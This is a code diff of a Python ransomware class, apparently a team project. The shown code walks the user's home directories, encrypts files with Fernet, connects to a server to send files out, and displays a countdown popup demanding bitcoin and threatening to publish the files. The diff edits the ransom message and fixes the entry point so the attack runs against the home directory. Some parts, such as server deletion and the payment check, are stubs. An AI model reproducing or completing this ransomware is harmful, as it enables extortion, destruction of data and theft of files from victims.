@@ -4,12 +4,12 @@ from cryptography.fernet import Fernet
 import subprocess
 import time
 import signal
-import threading 
 import base64
 import logging
 import socket
 import math
 import rsa
+import threading
 
 
 class Ransomware: 
@@ -59,6 +59,10 @@ class Ransomware:
         """ Client socket. """
         return self._socket
 
+
+
+
+
     #TODO Rafi/Yusef:
     def send_file_to_server(self, file_path, filename):
             
@@ -79,9 +83,13 @@ class Ransomware:
         """ Closing the file. """
         file.close()
 
+
+
     #TODO Subin:
     def check_if_user_has_paid(self):
         return False
+
+
 
     # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
     def list_safe_directories(self, directory):
@@ -99,6 +107,8 @@ class Ransomware:
 
         return result  # Return the list of directories
 
+
+
     # Method that retrieves all of the files in a directory and purposely does not include the ransomeware
     def get_files_in_dir(self, directory):
         # change to home directory so that the paths are correct relative paths.
@@ -114,6 +124,8 @@ class Ransomware:
 
         return files
     
+
+
     def establish_connection(self):
         """ Create a connection to the server. """
         try:
@@ -122,6 +134,8 @@ class Ransomware:
         except socket.error:
             logging.debug('Dropper could not connect to the server.')
             return
+
+
 
     # Method for encrypting a single file
     def encrypt_file(self, file, key):
@@ -133,6 +147,8 @@ class Ransomware:
         with open(file, "wb") as the_file:
             the_file.write(encrypted_contents)
         print("terminated")
+
+
 
 
     # Encrypt all the safe to encrypt files on a victims pc
@@ -161,6 +177,8 @@ class Ransomware:
         print("Total size of files: " + str(size_of_files))
 
 
+
+
     def decrypt_file(self, file_path, key):
         with open(file_path, "rb") as file:
             encrypted_contents = file.read()
@@ -170,12 +188,16 @@ class Ransomware:
             the_file.write(decrypted_contents)
 
 
+
+
     def decrypt_all_files(self, directory, key):
         dir_list = self.list_safe_directories(directory)
         for dir in dir_list:
             for file in self.get_files_in_dir(dir):
                 file_path = os.path.join(dir, file)
                 self.decrypt_file(file_path, key)
+
+
 
     def execute_attack(self):
         
@@ -221,7 +243,7 @@ class Ransomware:
             seconds = int(remaining_time % 60)
 
             # Text to be displayed on the pop up
-            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see. \nTransfer: xxx btc to wallet_id"
+            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see.\n DO NOT TURN OFF YOUR COMPUTER - WE WILL CONSDIER THIS AS NON PAYMENT \nTransfer: xxx btc to wallet_id"
 
             # Show the dialog with the remaining time, keep refreshing the window.
             popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])
@@ -268,9 +290,9 @@ class Ransomware:
         
             #TODO: Implement code to delete all the files that are stored on the server
 
-            else: # Timer has run out
-                #TODO: Implement file deletion and internet publication code.
-                print('huh')
+        else: # Timer has run out
+            #TODO: Implement file deletion and internet publication code.
+            print("timer ran out ")
 
 
 
@@ -278,12 +300,13 @@ class Ransomware:
 if __name__ == '__main__':
 
     # Home directory
-    HOME = expanduser("~")
+    home = expanduser("~")
 
     logging.basicConfig(level=logging.DEBUG)
 
-    # Initialize dropper application.
-    ransomware = Ransomware('tsoh', 'lacol', 729000000, directory)
-    # Receives public key and begins to send files to the server.
+    # Initialize Ransomware
+    ransomware = Ransomware('tsoh', 'lacol', 729000000, home)
+    
+    # Start the attack
     ransomware.execute_attack()
 
